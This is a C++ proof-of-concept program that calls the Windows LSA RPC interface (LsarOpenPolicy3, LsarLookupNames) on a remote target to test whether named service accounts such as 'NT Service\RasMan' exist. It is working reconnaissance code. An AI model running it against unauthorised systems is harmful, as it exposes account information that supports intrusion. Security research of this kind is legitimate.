// MS-lsat-poc.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
#define WIN32_NO_STATUS // This magic incantation lets us safely use NTSTATUS macros in userland
#include <windows.h>
#undef WIN32_NO_STATUS
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>
#include "rpc_helpers.h"
#include <sddl.h>
#include "ms-lsar.h"

#define POLICY_VIEW_LOCAL_INFORMATION              0x00000001L
#define POLICY_VIEW_AUDIT_INFORMATION              0x00000002L
#define POLICY_GET_PRIVATE_INFORMATION             0x00000004L
#define POLICY_TRUST_ADMIN                         0x00000008L
#define POLICY_CREATE_ACCOUNT                      0x00000010L
#define POLICY_CREATE_SECRET                       0x00000020L
#define POLICY_CREATE_PRIVILEGE                    0x00000040L
#define POLICY_SET_DEFAULT_QUOTA_LIMITS            0x00000080L
#define POLICY_SET_AUDIT_REQUIREMENTS              0x00000100L
#define POLICY_AUDIT_LOG_ADMIN                     0x00000200L
#define POLICY_SERVER_ADMIN                        0x00000400L
#define POLICY_LOOKUP_NAMES                        0x00000800L
#define POLICY_NOTIFICATION                        0x00001000L


RPC_UNICODE_STRING strings;

void usage()
{
    printf("<prog.exe> <target>");
}



int list_names(wchar_t* target)
{
    LSAPR_OBJECT_ATTRIBUTES lsa_obj = { 0 }; // sets root dir to null
    LSAPR_HANDLE hlsa = INVALID_HANDLE_VALUE;
    HRESULT hr = S_OK;
    RPC_UNICODE_STRING strings[2] = { 0 };
    LSAPR_REVISION_INFO rev_info = { 0 }, out_rev_info = { 0 };
    rev_info.V1.Revision = 1;
    rev_info.V1.SupportedFeatures = 0;
    ULONG out_rev_ver = 0;
    PLSAPR_REFERENCED_DOMAIN_LIST ref_dom = NULL;
    LSAPR_TRANSLATED_SIDS ts = { 0 };
    unsigned long count = 0;


    make_unicode_str((PUNICODE_STRING) & (strings[0]), L"NT Service\\RasMan");
    make_unicode_str((PUNICODE_STRING) & (strings[1]), L"NT Service\\ThisSHouldNotExist");
    LSAPR_POLICY_PRIMARY_DOM_INFO pdi = { 0 };
    RpcTryExcept
    hr = LsarOpenPolicy3(target, &lsa_obj,  POLICY_LOOKUP_NAMES, 1,&rev_info, &out_rev_ver, &out_rev_info, &hlsa);
    if (!NT_SUCCESS(hr))
    {
        printf("failed to open policy %ld\n", hr);
        return FALSE;
    }
    hr = LsarLookupNames(hlsa, 2, strings, &ref_dom,  &ts, LsapLookupWksta, &count);
    if (!NT_SUCCESS(hr))
    {
        printf("translation failed %ld\n", hr);
        LsarClose(&hlsa);
        return FALSE;
    }
    else
    {
        printf("it worked!\n");
        for (int i = 0; i < ts.Entries; i++)
        {
            printf("%ls %s\n", strings[i].Buffer, (ts.Sids[i].DomainIndex == -1) ? "Does not exist" : "Exists");
        }
    }
    RpcExcept(RpcExceptionFilter(RpcExceptionCode()))
        printf("An exception occured while attempting to make the RPC call, recovering and bailing: %lu\n", RpcExceptionCode());
    RpcEndExcept
    LsarClose(&hlsa);

}

int wmain(int argc, wchar_t ** argv)
{
    if (argc != 2)
    {
        usage();
        return (1);
    }
    //If this used a more traditional interface, here is what a setup call would have looked like
    //make_rpc_request(lsarpc_v0_0_c_ifspec, argv[1], (RPC_WSTR)(L"\\pipe\\lsarpc"), 0, L"host", NULL, NULL, L"12345778-1234-ABCD-EF00-0123456789AB", TRUE, list_names, argv[2]);
    //but it doesn't so we just call into it
    list_names(argv[1]);

}

